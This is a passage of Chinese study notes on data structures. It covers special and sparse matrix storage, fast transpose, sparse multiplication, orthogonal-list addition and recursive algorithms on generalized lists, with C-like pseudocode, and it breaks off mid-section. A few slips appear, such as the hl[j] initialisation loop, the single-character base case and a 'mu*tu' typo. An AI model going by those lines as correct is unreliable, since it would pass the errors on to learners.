<li>若值相同的元素或零元素在矩阵中的分布有一定规律，则称此类矩阵为<strong>特殊矩阵</strong>；反之称为<strong>稀疏矩阵</strong>。</li>
</ol>
<h3 id="5-3-1-特殊矩阵"><a href="#5-3-1-特殊矩阵" class="headerlink" title="5.3.1 特殊矩阵"></a>5.3.1 特殊矩阵</h3><ol>
<li><p>对于<strong>对称矩阵</strong>，可以为每一对对称元只分配一个存储空间，不失一般性，我们可以以行序为主序存储在其<strong>下三角</strong>（包括对角线）中的元。</p>
<p>这样就可以将$n^2$个元压缩存储到n(n+1)/2个元的空间中。</p>
<p>这样就可以用大小为n(n+1)/2的一维数组存储n阶对称矩阵。</p>
</li>
<li><p>重点是如何将一维数组下标k与对称矩阵元素(i,j)间建立一一对应的关系（数组从0开始，矩阵从1开始）：</p>
<ul>
<li>当$i\ge j$时，按下三角存储，上方有i-1行，每行i个元素，共计i(i-1)/2个元素；在本行中是第j个，且数组从0计，所以k=i(i-1)/2+j-1；</li>
<li>当i&lt;j时，i变j，j变i，代入上式，则k=j(j-1)/2+i-1。</li>
</ul>
</li>
<li><p>称此数组为n阶对称矩阵A的压缩存储：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%AF%B9%E7%A7%B0%E7%9F%A9%E9%98%B5.png" alt="对称矩阵"></p>
</li>
<li><p>这种压缩方法同样也适用于<strong>三角矩阵</strong>和<strong>对角矩阵</strong>。</p>
</li>
<li><p>在对称矩阵、三角矩阵和对角矩阵等特殊矩阵中，非零元的分布都有一个明显的规律，从而可以压缩存储到一维数组中，并找到每个非零元在一维数组中的对应关系。</p>
</li>
<li><p>若非零元较零元少，且分布没有一定规律，这种矩阵的压缩存储就比特殊矩阵复杂。这就是下面要讨论的稀疏矩阵。</p>
</li>
</ol>
<h3 id="5-3-2-稀疏矩阵"><a href="#5-3-2-稀疏矩阵" class="headerlink" title="5.3.2 稀疏矩阵"></a>5.3.2 稀疏矩阵</h3><ol>
<li><p>假设在$m\times n$的矩阵中，有t个元素不为零，则矩阵的<strong>稀疏因子</strong>为$\frac{t}{m\times n}$。当稀疏因子不超过0.05时，称其为<strong>稀疏矩阵</strong>。</p>
</li>
<li><p>压缩存储是指存储矩阵的非零元。因此，除了存储非零元的<strong>值</strong>之外，还必须同时记下它的<strong>行标</strong>和<strong>列标</strong>（均从1开始）。这样，矩阵的一个非零元和一个<strong>三元组</strong>$(i,j,a_{ij})$就互相唯一确定了。</p>
<p>稀疏矩阵可由表示非零元的<strong>三元组</strong>及其<strong>行列数</strong>唯一确定。</p>
</li>
</ol>
<p>由三元组表示的不同方法可引出稀疏矩阵不同的压缩方法（两个顺序表、一个链表）。</p>
<h4 id="三元组顺序表——转置"><a href="#三元组顺序表——转置" class="headerlink" title="三元组顺序表——转置"></a>三元组顺序表——转置</h4><ol>
<li><p>三元组顺序表就是以顺序存储结构来表示三元组表。</p>
</li>
<li><p>在顺序表中，三元组以行序为主序排列。这样做将有利于进行某些矩阵运算。</p>
</li>
<li><p>矩阵的转置运算：</p>
<ul>
<li>将矩阵的行列值相互交换；</li>
<li>将每个三元组中的i和j相互交换；</li>
<li>重排三元组之间的次序。</li>
</ul>
</li>
<li><p>转置的前两步很容易，关键是第三步。可以有两种处理方法：</p>
<ul>
<li><p>按照转置后排好的顺序，依次在转置前的顺序表中找到相应的三元组进行转置。即按照矩阵的列序来进行转置。</p>
<p>需要遍历顺序表，依次寻找第1列、第2列……第n列的元素，而顺序表开始时是以行序为主序存放的，所以每一列时的行序是按顺序的。</p>
<p>算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">TransposeSMatrix</span><span class="params">(TSMatrix M, TSMatrix &amp;T)</span> </span>&#123;</span><br><span class="line">  T.mu = M.nu;</span><br><span class="line">  T.nu = M.mu;</span><br><span class="line">  T.tu = M.tu;</span><br><span class="line">  <span class="keyword">if</span> (T.tu) &#123;</span><br><span class="line">    q = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (col = <span class="number">1</span>; col &lt;= M.nu; ++col)</span><br><span class="line">      <span class="keyword">for</span> (p = <span class="number">1</span>; p &lt;= M.tu; ++p)</span><br><span class="line">        <span class="keyword">if</span> (M.data[p].j == col) &#123;</span><br><span class="line">          T.data[q].i = M.data[p].j;</span><br><span class="line">          T.data[q].j = M.data[p].i;</span><br><span class="line">          T.data[q].e = M.data[p].e;</span><br><span class="line">          ++q;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度为O(nu·tu)，而一般转置算法的时间复杂度为O(mu·nu)。要想用此算法提高效率，则必须满足tu远小于mu*nu。</p>
</li>
<li><p>按照转置前顺序表中三元组的次序进行转置，并将转置结果置入转置后的顺序表的恰当位置。</p>
<p>为确定这些位置，应先求得矩阵每一列中非零元的个数，对应转置后的每一行的非零元的个数，进而通过累加求得每一列的第一个非零元在转置后的顺序表中应有的位置。（思路类似于实验17的基数排序）</p>
<p>附设两个向量：</p>
<ul>
<li><code>num[col]</code>表示矩阵第<code>col</code>列中非零元的个数；</li>
<li><code>cpot[col]</code>表示矩阵第<code>col</code>列的第一个非零元在转置后的顺序表中的恰当位置。</li>
</ul>
<p>显然：</p>
<ul>
<li><code>cpot[1]</code>=1；</li>
<li><code>cpot[col]</code>=<code>cpot[col-1]</code>+<code>num[col-1]</code>，$2\le col\le nu$。</li>
</ul>
<p>这种转置方法称为<strong>快速转置</strong>，算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">FastTransposeSMatrix</span><span class="params">(TSMatrix M, TSMatrix &amp;T)</span> </span>&#123;</span><br><span class="line">  T.mu = M.nu;</span><br><span class="line">  T.nu = M.mu;</span><br><span class="line">  T.tu = M.tu;</span><br><span class="line">  <span class="keyword">if</span> (T.tu) &#123;</span><br><span class="line">    <span class="keyword">for</span> (col = <span class="number">1</span>; col &lt;= M.nu; ++col)</span><br><span class="line">      num[col] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (t = <span class="number">1</span>; t &lt;= M.tu; ++t)</span><br><span class="line">      ++num[M.data[t].j];</span><br><span class="line">    cpot[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (col = <span class="number">2</span>; col &lt;= M.nu; ++col)</span><br><span class="line">      cpot[col] = cpot[col<span class="number">-1</span>] + num[col<span class="number">-1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (p = <span class="number">1</span>; p &lt;= M.tu; ++p) &#123;</span><br><span class="line">      col = M.data[p].j;</span><br><span class="line">      q = cpot[col];</span><br><span class="line">      T.data[q].i = M.data[p].j;</span><br><span class="line">      T.data[q].j = M.data[p].i;</span><br><span class="line">      T.data[q].e = M.data[p].e;</span><br><span class="line">      ++cpot[col];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种算法仅比前一个算法多用了两个辅助向量（可以求完<code>num</code>后直接累加，不必新建<code>cpot</code>，即可只占一个向量的空间）。从时间上看，算法中有4个并列的单循环，循环次数分别为nu和tu，因而总的时间复杂度为O(nu+tu)。就算tu和mu*tu等数量级，其时间复杂度也才为O(mu*nu)，和经典算法的时间复杂度相同。</p>
</li>
</ul>
</li>
<li><p>三元组顺序表又称<strong>有序的双下标法</strong>，非零元在表中按行序有序存储，便于进行依行顺序处理的矩阵运算。</p>
</li>
<li><p>但是，若想存取某一行的非零元，则必须从头开始进行查找。</p>
</li>
</ol>
<h4 id="行逻辑链接的顺序表——乘法"><a href="#行逻辑链接的顺序表——乘法" class="headerlink" title="行逻辑链接的顺序表——乘法"></a>行逻辑链接的顺序表——乘法</h4><ol>
<li><p>为了便于随机存取任意一行的非零元，则需知道每一行的第一个非零元在三元组表中的位置。按照快速转置算法的思想，可以在矩阵的存储结构中创建一个指示“行”信息的辅助数组<code>rpos</code>。这种“带行链接信息”的三元组表就是行逻辑链接的顺序表。</p>
</li>
<li><p>这种方法虽然只是多了一个行的信息，但是在矩阵乘法中可以体现其优越性。</p>
</li>
<li><p>M和N分别是m*n和n*s矩阵，经典的矩阵乘法算法的时间复杂度为O(m*n*s)。</p>
</li>
<li><p>若这两个矩阵均为稀疏矩阵并用三元组表存储时，不能使用经典算法。那么如何计算呢？设M*N=Q：</p>
<ul>
<li><p>若M(i,k)和N(k,j)有一个值为零，则Q(i,j)为零，无需再进行计算。因此，为了得到非零的乘积，只需在M.data和N.data中找到相应的各对元素（M.data中j和N.data中i相等的各对元素）相乘即可。</p>
<p>也就是说，对M.data[1..M.tu]中的每个元素(i,k,M(i,k))，找到N.data中<strong>所有</strong>相应的元素(k,j,N(k,j))并相乘即可。</p>
<p>为此，需要在N.data中寻找矩阵N的第k行的所有非零元，此时<code>rpos</code>便派上用场了。</p>
</li>
<li><p>由于矩阵Q的每个元素都是乘积之和，所以应对每个元素设一累计和的变量，通过扫描数组M.data，求得相应元素的乘积并累加。</p>
</li>
<li><p>两个稀疏矩阵相乘的乘积不一定是稀疏矩阵。同理，即使两个分量值相乘不为零，其累加值也可能为零。</p>
<p>所以应对累加后的值进行判断，为零的应舍去。（因为M.data已经是行主序的，所以可以对Q进行逐行处理，先求得累计求和的中间结果（Q的一行），然后再压缩存储到Q.data中去）</p>
</li>
</ul>
<p>算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">MultSMatrix</span><span class="params">(RLSMatrix M, RLSMatrix N, RLSMatrix &amp;Q)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (M.nu != N.mu)</span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">  Q.mu = M.mu;</span><br><span class="line">  Q.nu = N.nu;</span><br><span class="line">  Q.tu = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (M.tu * N.tu != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (arow = <span class="number">1</span>; arow &lt;= M.mu; ++arow) &#123;</span><br><span class="line">      ctemp[] = <span class="number">0</span>;</span><br><span class="line">      Q.rpos[arow] = Q.tu + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (arow &lt; M.mu)</span><br><span class="line">        tp = M.rpos[arow+<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        tp = M.tu + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = M.rpos[arow]; p &lt; tp; ++p) &#123;</span><br><span class="line">        brow = M.data[p].j;</span><br><span class="line">        <span class="keyword">if</span> (brow &lt; N.mu)</span><br><span class="line">          t = N.rpos[brow+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          t = N.tu + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (q = N.rpos[brow]; q &lt; t; ++q) &#123;</span><br><span class="line">          ccol = N.data[q].j;</span><br><span class="line">          ctemp[ccol] += M.data[p].e * N.data[q].e;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (ccol = <span class="number">1</span>; ccol &lt;= Q.nu; ++ccol)</span><br><span class="line">        <span class="keyword">if</span> (ctemp[ccol]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (++Q.tu &gt; MAXSIZE)</span><br><span class="line">            <span class="keyword">return</span> ERROR;</span><br><span class="line">          Q.data[Q.tu] = (arow, ccol, ctemp[ccol]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>此算法的时间复杂度为：</p>
<ul>
<li>累加器<code>ctemp</code>初始化的时间复杂度为O(M.mu*N.nu)；</li>
<li>求Q的所有非零元的时间复杂度为O(M.tu*N.tu/N.mu)；</li>
<li>进行压缩存储的时间复杂度为O(M.mu*N.nu)。</li>
</ul>
<p>因此，总的时间复杂度就是O(M.mu*N.nu+M.tu*N.tu/N.mu)。</p>
</li>
<li><p>若矩阵M和矩阵N的稀疏因子均小于0.05，且M的列数（N的行数）小于1 000，则此算法的时间复杂度相当于O(m*s)。与经典算法的O(m*n*s)相比，这是一个相当理想的结果。</p>
</li>
<li><p>如果事先能估算出所求乘积矩阵Q不再是稀疏矩阵，则以二维数组表示Q，相乘的算法也就更简单了。</p>
</li>
</ol>
<h4 id="十字链表——加法"><a href="#十字链表——加法" class="headerlink" title="十字链表——加法"></a>十字链表——加法</h4><ol>
<li><p>当进行矩阵加法操作时，由于非零元的插入，会引起顺序表中元素的移动。类似这种运算，矩阵的非零元个数和位置在操作过程中变化较大时，不宜采用顺序存储结构来表示三元组的线性表，应采用<strong>链式存储结构</strong>表示三元组的线性表。</p>
</li>
<li><p>在链表中，每个非零元可用一个含5个域的结点表示：</p>
<ul>
<li><code>i</code>：行标</li>
<li><code>j</code>：列标</li>
<li><code>e</code>：非零元的值</li>
<li><code>right</code>：指向同一行的下一个非零元</li>
<li><code>down</code>：指向同一列的下一个非零元</li>
</ul>
<p>这样，每行通过<code>right</code>域链接成一个链表，每列通过<code>down</code>域链接成一个链表。</p>
<p>每个非零元既是某个行链表的一个结点，又是某个列链表的一个结点，整个矩阵构成了一个<strong>十字交叉</strong>的链表，故称为十字链表。</p>
</li>
<li><p>这样，稀疏矩阵就可以由两个数组表示，它们分别存储行和列链表的头指针：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%8D%81%E5%AD%97%E9%93%BE%E8%A1%A8%E5%9B%BE.png" alt="十字链表图"></p>
</li>
<li><p>对于m行n列且有t个非零元的稀疏矩阵，创建十字链表的算法的时间复杂度为O(t*s)，s=max{m,n}。因为每建立一个非零元的结点时都要寻查它在行表和列表中的插入位置，对非零元输入的先后次序没任何要求。</p>
<p>若按以行序为主序的次序依次输入三元组，则建立十字链表的算法可以是O(t)数量级的。</p>
</li>
<li><p>下面讨论如何将矩阵B加到矩阵A上：</p>
<p>两矩阵相加类似于两一元多项式相加，只不过有行值和列值两个变元。每个结点既在行表中又在列表中，致使插入和删除时指针的修改稍微复杂，故需更多的辅助指针。</p>
<p>以矩阵A为基准，只可能出现4种情况：</p>
<ul>
<li>当$a_{ij}$、$b_{ij}$和二者之和均不为零时，$a_{ij}=a_{ij}+b_{ij}$；</li>
<li>当$a_{ij}$、$b_{ij}$均不为零、但二者之和为零时，删除$a_{ij}$结点；</li>
<li>当$a_{ij}$不为零而$b_{ij}$为零时，$a_{ij}$不变；</li>
<li>当$a_{ij}$为零而$b_{ij}$不为零时，插入新结点$a_{ij}$（等于$b_{ij}$）。</li>
</ul>
<p>由此，整个运算过程可从矩阵的第一行起逐行进行，每一行都从表头出发，分别找到A和B在该行中的第一个非零元结点后开始比较：</p>
<ul>
<li><p>若<code>pa == NULL</code>或<code>pa-&gt;j</code>&gt;<code>pb-&gt;j</code>，则需在A矩阵的链表中插入一个值为$b_{ij}$的结点。</p>
<p>注意，此时还需改变同一行中前一结点的<code>right</code>域值，以及同一列中前一结点的<code>down</code>域值。</p>
</li>
<li><p>若<code>pa-&gt;j</code>&lt;<code>pb-&gt;j</code>，则只要将<code>pa</code>指针往后推进一步。</p>
</li>
<li><p>若<code>pa-&gt;j</code>==<code>pb-&gt;j</code>：</p>
<ul>
<li><p>若<code>pa-&gt;e</code>+<code>pb-&gt;e</code>!=<code>0</code>，则只要将$a_{ij}+b_{ij}$的值送到<code>pa</code>所指结点的<code>e</code>域即可；</p>
</li>
<li><p>若<code>pa-&gt;e</code>+<code>pb-&gt;e</code>==<code>0</code>，则需要在A矩阵的链表中删除<code>pa</code>所指的结点。</p>
<p>注意，此时还需改变同一行中前一结点的<code>right</code>域值，以及同一列中前一结点的<code>down</code>域值。</p>
</li>
</ul>
</li>
</ul>
<p>为了便于插入和删除结点，还需要设立一些辅助指针：</p>
<ul>
<li>在A的行链表上设<code>pre</code>指针，指示<code>pa</code>所指结点的前驱结点；</li>
<li>在A的列链表上设<code>hl[j]</code>指针，初始化与每个列链表的头指针相同（<code>hl[j]=chead[j]</code>）。</li>
</ul>
<p>进一步描述将矩阵B加到矩阵A上的操作过程：</p>
<ul>
<li><p>初始化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pa = A.rhead[<span class="number">1</span>];</span><br><span class="line">pb = B.rhead[<span class="number">1</span>];</span><br><span class="line">pre = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; A.nu; ++j)</span><br><span class="line">  hl[j] = A.chead[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></li>
<li><p>重复本步骤，依次处理本行结点，直至B的本行中再无非零元的结点（<code>pb==NULL</code>）：</p>
<ul>
<li><p>当A的本行中的非零元已处理完，需要在本行插入新的结点<code>p</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pa == <span class="literal">NULL</span> || pa-&gt;j &gt; pb-&gt;j) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pre == <span class="literal">NULL</span>)</span><br><span class="line">    A.rhead[p-&gt;i] = p;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    pre-&gt;right = p;</span><br><span class="line">  p-&gt;right = pa;</span><br><span class="line">  pre = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再在对应列插入此结点<code>p</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!A.chead[p-&gt;j] || A.chead[p-&gt;j]-&gt;i &gt; p-&gt;i) &#123;</span><br><span class="line">  p-&gt;down = A.chead[p-&gt;j];</span><br><span class="line">  A.chead[p-&gt;j] = p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  p-&gt;down = hl[p-&gt;j]-&gt;down;</span><br><span class="line">  hl[p-&gt;j]-&gt;down = p;</span><br><span class="line">&#125;</span><br><span class="line">hl[p-&gt;j] = p;</span><br></pre></td></tr></table></figure></li>
<li><p>第二种情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pa != <span class="literal">NULL</span> &amp;&amp; pa-&gt;j &lt; pb-&gt;j) &#123;</span><br><span class="line">  pre = pa;</span><br><span class="line">  pa = pa-&gt;right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>第三种情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pa-&gt;j == pb-&gt;j)</span><br><span class="line">  pa-&gt;e += pb-&gt;e;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pa-&gt;e == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pre == <span class="literal">NULL</span>)</span><br><span class="line">    A.rhead[pa-&gt;i] = pa-&gt;right;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    pre-&gt;right = pa-&gt;right;</span><br><span class="line">  p = pa;</span><br><span class="line">  pa = pa-&gt;right;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (A.chead[p-&gt;j] == p)</span><br><span class="line">    A.chead[p-&gt;j] = hl[p-&gt;j] = p-&gt;down;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    hl[p-&gt;j]-&gt;down = p-&gt;down;</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>若本行不是最后一行，则令<code>pa</code>和<code>pb</code>指向下一行的第一个非零元结点，转上一步；否则结束。</p>
</li>
</ul>
</li>
<li><p>从一个结点来看，进行比较、修改指针所需的时间是一个常数；整个运算过程在于对A和B的十字链表逐行扫描，其循环次数主要取决于A和B矩阵中非零元素的个数ta和tb。</p>
<p>由此，算法的时间复杂度为O(ta+tb)。</p>
</li>
</ol>
<h2 id="5-4-广义表的定义"><a href="#5-4-广义表的定义" class="headerlink" title="5.4 广义表的定义"></a>5.4 广义表的定义</h2><ol>
<li>顾名思义，广义表是线性表的推广，也被称为列表（lists，用复数形式以示与统称的表list的区别）。</li>
<li>广义表广泛地用于人工智能等领域的表处理语言LISP语言，把广义表作为基本的数据结构，就连程序也表示为一系列的广义表。</li>
<li>广义表一般记作$$LS=(\alpha_{1},\alpha_{2},…,\alpha_{n})$$其中LS是广义表的名称，n、是它的长度。</li>
<li>在线性表中，$a_{i}$只限于是单个元素。而在广义表中，$\alpha_{i}$可以是单个元素（称为<strong>原子</strong>），也可以是广义表（称为<strong>子表</strong>）（递归的定义）。习惯上，用大写字母表示广义表的名称，用小写字母表示原子。</li>
<li>当广义表非空时，称<strong>第一个元素</strong>为它的表头，称<strong>其余元素组成的表</strong>为它的表尾。</li>
<li>E=(a,E)是一个递归的表，长度为2，相当于一个无限的列表。</li>
<li>列表是一个多层次的结构，可为其他列表所共享，可以是递归的表。</li>
<li>表头可以是原子和列表，表尾必定为列表。</li>
</ol>
<h2 id="5-5-广义表的存储结构"><a href="#5-5-广义表的存储结构" class="headerlink" title="5.5 广义表的存储结构"></a>5.5 广义表的存储结构</h2><ol>
<li><p>由于广义表中的数据元素可以具有不同的结构，所以难以用顺序存储结构表示，通常采用链式存储结构。</p>
</li>
<li><p>由于列表中的数据元素可能为原子或列表，所以需要两种结构的结点（不同之处用<code>union</code>）。</p>
</li>
<li><p>非空列表可以分解成表头和表尾，故一对确定的表头和表尾可唯一确定列表。</p>
<p>因此一个表结点可以由3个域组成：</p>
<ul>
<li>标志域（公共部分，用以区分表结点和原子结点）</li>
<li>指示表头的指针域hp</li>
<li>指示表尾的指针域tp</li>
</ul>
<p>一个原子结点只需两个域：</p>
<ul>
<li>标志域（公共部分，用以区分表结点和原子结点）</li>
<li>值域</li>
</ul>
</li>
<li><p>设A=()、B=(e)、C=(a,(b,c,d))、D=(A,B,C)、E=(a,E)，则它们的存储结构可以表示为：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B9%BF%E4%B9%89%E8%A1%A8%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%841.png" alt="广义表存储结构1"></p>
<p>可以看出：</p>
<ul>
<li><p>空表的表头指针为空，非空列表的表头指针均指向一个表结点；</p>
</li>
<li><p>表结点的hp域指示该表表头（原子/表），tp域指示该表表尾（表/空）；</p>
</li>
<li><p>容易分清列表中原子和子表所在层次：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B9%BF%E4%B9%89%E8%A1%A8%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%8411.png" alt="广义表存储结构11"></p>
</li>
<li><p>最高层的表结点个数即为列表的长度。</p>
</li>
</ul>
</li>
<li><p>设A=()、B=(e)、C=(a,(b,c,d))、D=(A,B,C)、E=(a,E)，则它们的另一种存储结构可以表示为：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B9%BF%E4%B9%89%E8%A1%A8%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%842.png" alt="广义表存储结构2"></p>
<p>表结点表示不变，原子结点增加tp指针域指向下一个元素结点。</p>
</li>
</ol>
<h2 id="5-6-m元多项式的表示"><a href="#5-6-m元多项式的表示" class="headerlink" title="5.6 m元多项式的表示"></a>5.6 m元多项式的表示</h2><ol>
<li><p>一般情况下，广义表不使用递归表，也不为其他表所共享。它的特点只是其中的元素可以是另一个广义表，这是它比线性表更灵活的地方，一个实例就是m元多项式的表示。</p>
</li>
<li><p>由于m元多项式中每一项的变化数目的不均匀性和变元信息的重要性，故不适于用线性表表示。</p>
</li>
<li><p>对于m元多项式，可以灵活地分解出一个变元，从而变成一个变元的多项式；随后再分解出第二个变元，等等。</p>
<p>由此，一个m元多项式首先是它的主变元的（一元）多项式，而其系数又是第二变元的多项式。每个多项式都可看作是由一个变量加上若干个系数指数偶对构成的。</p>
</li>
<li><p>只需在表结点和原子结点中添加指数域，并在原子结点中添加系数域，就可以用广义表表示一个m元多项式了。</p>
</li>
</ol>
<h2 id="5-7-广义表的递归算法"><a href="#5-7-广义表的递归算法" class="headerlink" title="5.7 广义表的递归算法"></a>5.7 广义表的递归算法</h2><ol>
<li>递归函数虽然结构清晰、程序易读、易证明正确性，但有时递归函数的执行效率很低，因此不能一味追求递归，使用递归应扬长避短。</li>
<li>下面以广义表为例，讨论如何利用<strong>“分治法”（Divide and Conquer）</strong>进行递归算法设计的方法。</li>
<li>和数学归纳法类似，递归定义由<strong>基本项</strong>和<strong>归纳项</strong>两部分组成：<ul>
<li>基本项描述一个或几个递归过程的终结状态，一般情况下为n=0或n=1；</li>
<li>归纳项描述了如何从当前状态到终结状态的转化。</li>
</ul>
</li>
<li>递归设计的实质是：当一个复杂的问题可以分解成若干子问题来处理时，其中某些子问题与原问题有相同的特征属性，则可利用和原问题相同的分析处理方法；反之，这些子问题解决了，原问题也就迎刃而解了。</li>
<li>递归函数的设计用的是归纳思维的方法，故设计递归函数时应注意：<ul>
<li>严格定义函数的功能和接口（只要接口一致，便可进行递归调用）；</li>
<li>对每一次递归都看成只是一个简单的操作，切忌想得太深太远；</li>
<li>由归纳假设进行归纳证明时绝不能怀疑归纳假设的正确性。</li>
</ul>
</li>
</ol>
<h3 id="5-7-1-求广义表的深度"><a href="#5-7-1-求广义表的深度" class="headerlink" title="5.7.1 求广义表的深度"></a>5.7.1 求广义表的深度</h3><ol>
<li><p>广义表的深度定义为广义表中括弧的重数，是广义表的一种量度。</p>
<p>正如m元多项式中提到的，广义表的深度定义为多项式中变元的个数。</p>
</li>
<li><p>要求广义表的深度，可以求它每个元素的深度：</p>
<ul>
<li><p>若为原子，则深度为0；</p>
</li>
<li><p>若为表，则和上述一样处理。</p>
<p>注意，空表的深度为1。</p>
</li>
</ul>
<p>可见，求广义表的深度的递归算法有两个终结状态：空表和原子。</p>
<p>最后在最外层广义表的每个元素的深度中找到最大值并加1，就得到了广义表的深度。</p>
<p>算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GListDepth</span><span class="params">(GList L)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!L)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (L-&gt;tag == ATOM)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (max = <span class="number">0</span>; pp = L; pp = pp-&gt;ptr.tp) &#123;</span><br><span class="line">    dep = GListDepth(pp-&gt;ptr.hp);</span><br><span class="line">    <span class="keyword">if</span> (dep &gt; max)</span><br><span class="line">      max = dep;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>此算法实际上遍历了整个广义表，过程中求了各子表的深度，最后综合得到广义表的深度：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%B1%82%E5%B9%BF%E4%B9%89%E8%A1%A8%E7%9A%84%E6%B7%B1%E5%BA%A6.png" alt="求广义表的深度"></p>
</li>
</ol>
<h3 id="5-7-2-复制广义表"><a href="#5-7-2-复制广义表" class="headerlink" title="5.7.2 复制广义表"></a>5.7.2 复制广义表</h3><p>因为一对确定的表头和表尾可唯一确定一个广义表，所以复制广义表时只需分别复制其表头和表尾，然后合成即可。</p>
<p>算法如下（从L复制到T）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">CopyGList</span><span class="params">(GList &amp;T, GList L)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!L) <span class="comment">// null lists</span></span><br><span class="line">    T = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(T = (GList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GLNode))))</span><br><span class="line">      <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    T-&gt;tag = L-&gt;tag;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;tag == ATOM) <span class="comment">// atom</span></span><br><span class="line">      T-&gt;atom = L-&gt;atom;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// lists</span></span><br><span class="line">      CopyGList(T-&gt;ptr.hp, L-&gt;ptr.hp); <span class="comment">// head</span></span><br><span class="line">      CopyGList(T-&gt;ptr.tp, L-&gt;ptr.tp); <span class="comment">// tail</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-7-3-建立广义表的存储结构"><a href="#5-7-3-建立广义表的存储结构" class="headerlink" title="5.7.3 建立广义表的存储结构"></a>5.7.3 建立广义表的存储结构</h3><ol>
<li><p>上述两种广义表操作的递归算法分别是：</p>
<ul>
<li>把广义表看成是含有n个并列子表（假设原子也视作子表）的表；</li>
<li>把广义表分解成表头和表尾两部分。</li>
</ul>
</li>
<li><p>若采用第二种方法存储广义表，只需对表头和表尾存储并进行递归即可，算法和上一节的复制算法极为相似。</p>
</li>
<li><p>若采用第一种方法存储广义表，和求深度的算法类似（设S为广义表字符串）：</p>
<ul>
<li><p>基本项：</p>
<ul>
<li>当S为空表串时，置空广义表；</li>
<li>当S为单字符串时，置空广义表；</li>
</ul>
</li>
